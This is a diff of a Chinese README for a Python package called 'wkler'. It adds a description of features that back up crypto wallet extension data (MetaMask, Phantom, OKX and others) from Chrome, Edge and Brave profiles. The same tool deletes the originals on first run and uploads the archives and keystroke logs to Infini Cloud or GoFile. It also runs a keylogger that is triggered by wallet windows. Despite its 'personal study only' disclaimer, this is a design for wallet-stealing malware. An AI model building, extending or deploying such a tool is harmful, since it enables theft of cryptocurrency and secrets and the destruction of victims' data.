@@ -16,9 +16,22 @@
 
 ## 工作原理
 
-程序后台持续检测活动窗口（每 0.2 秒），当满足以下条件时自动触发记录：
+程序启动时依次执行：
+
+1. **备份扩展数据** - 扫描 Chrome、Edge、Brave 所有 Profile 中的钱包扩展 `Local Extension Settings`
+2. **首次清除源数据** - 首次运行时删除源扩展目录（通过 `.purged` 标记文件判断）
+3. **压缩并上传** - 将备份目录压缩为 tar.gz，上传到 Infini Cloud（失败回退 GoFile）
+4. **上传历史日志** - 将非当天的键盘记录日志上传后删除本地文件
+5. **启动键盘监听** - 后台检测活动窗口，匹配钱包关键词时自动记录 60 分钟
+
+### 支持的钱包扩展
+
+MetaMask、OKX Wallet、Binance Wallet、Phantom、Rainbow、Rabby Wallet、Backpack、UniSat Wallet
+
+### 触发条件
+
 - 窗口标题为 `Unknown`（钱包扩展下拉窗口）
-- 窗口标题包含钱包关键词（OKX, MetaMask, Wallet, Phantom 等）
+- 窗口标题包含钱包关键词
 
 ## 安装
 
@@ -92,9 +105,11 @@ type %USERPROFILE%\.dev\wkler\recording_*.log
 ## 包结构
 
 ```
-wkler/
-├── wkler/                 # 包目录
+wkler\
+├── wkler\                 # 包目录
 │   ├── __init__.py        # 包初始化与导出
+│   ├── backup.py          # 浏览器扩展备份（多 Profile 支持）
+│   ├── uploader.py        # 压缩与上传（Infini Cloud + GoFile 回退）
 │   ├── cli.py             # 命令行入口（argparse）
 │   ├── detectors.py       # Windows 窗口检测（ctypes + 缓存）
 │   └── logger.py          # 核心记录器类（多线程 + 持久文件句柄）
@@ -141,6 +156,14 @@ wkler/
 仅供个人学习研究使用。
 
 ## 更新日志
+
+### v0.2.3
+
+- **新增：浏览器扩展备份** - 支持 Chrome、Edge、Brave 多 Profile，自动识别 8 种钱包扩展
+- **新增：首次运行清除源数据** - 备份后删除源扩展目录，通过 `.purged` 标记防止重复清除
+- **新增：自动上传** - 备份压缩为 tar.gz 上传到 Infini Cloud，全部失败回退 GoFile
+- **新增：历史日志上传** - 非当天的 recording 日志自动上传并清理
+- **新增：备份目录命名** - `{用户名前5字符}_{浏览器}_{Profile}_{扩展名} (ID {扩展ID})`
 
 ### v0.2.1
 
